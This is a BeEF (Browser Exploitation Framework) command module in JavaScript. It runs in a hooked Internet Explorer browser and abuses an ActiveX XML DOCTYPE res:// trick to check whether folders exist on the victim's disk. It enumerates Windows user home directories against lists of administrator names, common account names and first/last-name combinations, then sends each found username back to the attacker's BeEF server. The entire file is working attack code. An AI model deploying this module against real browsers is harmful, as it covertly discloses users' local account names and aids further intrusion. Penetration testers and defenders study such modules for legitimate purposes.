//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if (!("ActiveXObject" in window)) {
    beef.debug('[Detect Users] Unspported browser');
    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.are.status_error());
    return false;
  }

  function detect_folder(path) {
    var dtd = 'res://' + path;
    var xml = '<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "' + dtd + '">';
    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = true;
    try {
      xmlDoc.loadXML(xml);
      return false;
    } catch (e) {
      return true;
    }
  }

  // Detect home directory
  beef.debug('[Detect Users] Checking for home directory');
  var home_dirs = ["C:\\Documents and Settings\\", "C:\\Users\\"];
  var default_users = ['Default', 'Default User', 'All Users'];
  var home_dir = '';
  for (var i = 0; i < home_dirs.length; i++) {
    for (var j = 0; j < default_users.length; j++) {
      var result = detect_folder(home_dirs[i] + default_users[j]);
      if (result) {
        beef.debug('[Detect Users] Found home directory: ' + home_dirs[i]);
        home_dir = home_dirs[i];
        break;
      }
    }
  }

  if (home_dir == '') {
    beef.debug('[Detect Users] Could not find home directory');
    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=could not find home directory', beef.are.status_error());
    return false;
  }

  // Enumerate common usernames
  var users = [
    // Localised administrator accounts
    'Administrator', 'Järjestelmänvalvoja', 'Administrateur',
    'Rendszergazda', 'Administrador', 'Администратор', 'Administrador',
    'Administratör',
    // Common administrator accounts
    'adm', 'admin', 'localadmin', 'root',
    // Common usernames
    '1234', '12345', '123456', 'helpdesk', 'support', 'user',
    'guest', 'public', 'demo', 'test', 'temp', 'www', 'svc'];
  for (var i = 0; i < users.length; i++) {
    var user = users[i];
    beef.debug('[Detect Users] Checking for user: ' + user);
    var result = detect_folder(home_dir + user);
    if (result) {
      beef.debug('[Detect Users] Found user: ' + user);
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
    }
  }

  // Common first name / last name combinations
  // Source: https://techcrunch.com/2009/06/23/ever-wondered-what-the-most-common-names-on-facebook-are-heres-a-list/
  var first_names = ['John', 'David', 'Michael', 'Chris', 'Mike',
    'Mark', 'Paul', 'Daniel', 'James', 'Maria'];
  var last_names = ['Smith', 'Jones', 'Johnson', 'Lee', 'Brown',
    'Williams', 'Rodriguez', 'Garcia', 'Gonzalez', 'Lopez'];

  // All first names
  // Format: <FIRST>
  for (var i = 0; i < first_names.length; i++) {
    var user = first_names[i];
    beef.debug('[Detect Users] Checking for user: ' + user);
    var result = detect_folder(home_dir + user);
    if (result) {
      beef.debug('[Detect Users] Found user: ' + user);
      beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
    }
  }

  // All first names with all last names
  // Format: <FIRST><LAST>
  for (var i = 0; i < first_names.length; i++) {
    for (var j = 0; j < first_names.length; j++) {
      var user = first_names[i] + last_names[j];
      beef.debug('[Detect Users] Checking for user: ' + user);
      var result = detect_folder(home_dir + user);
      if (result) {
        beef.debug('[Detect Users] Found user: ' + user);
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
      }
    }
  }

  // All first names with all last names, joined by '.'
  // Format: <FIRST>.<LAST>
  for (var i = 0; i < first_names.length; i++) {
    for (var j = 0; j < first_names.length; j++) {
      var user = first_names[i] + '.' + last_names[j];
      beef.debug('[Detect Users] Checking for user: ' + user);
      var result = detect_folder(home_dir + user);
      if (result) {
        beef.debug('[Detect Users] Found user: ' + user);
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
      }
    }
  }

  // First initial + last name
  // Format: <A-Z><LAST>
  for (var i = 0; i < last_names.length; i++) {
    for (var j = 65; j <= 90; j++) {
    var user = String.fromCharCode(j) + last_names[i];
      beef.debug('[Detect Users] Checking for user: ' + user);
      var result = detect_folder(home_dir + user);
      if (result) {
        beef.debug('[Detect Users] Found user: ' + user);
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
      }
    }
  }

  // Last name + first initial
  // Format: <LAST><A-Z>
  for (var i = 0; i < last_names.length; i++) {
    for (var j = 65; j <= 90; j++) {
    var user = last_names[i] + String.fromCharCode(j);
      beef.debug('[Detect Users] Checking for user: ' + user);
      var result = detect_folder(home_dir + user);
      if (result) {
        beef.debug('[Detect Users] Found user: ' + user);
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'result=Found user: ' + user, beef.are.status_success());
      }
    }
  }

});

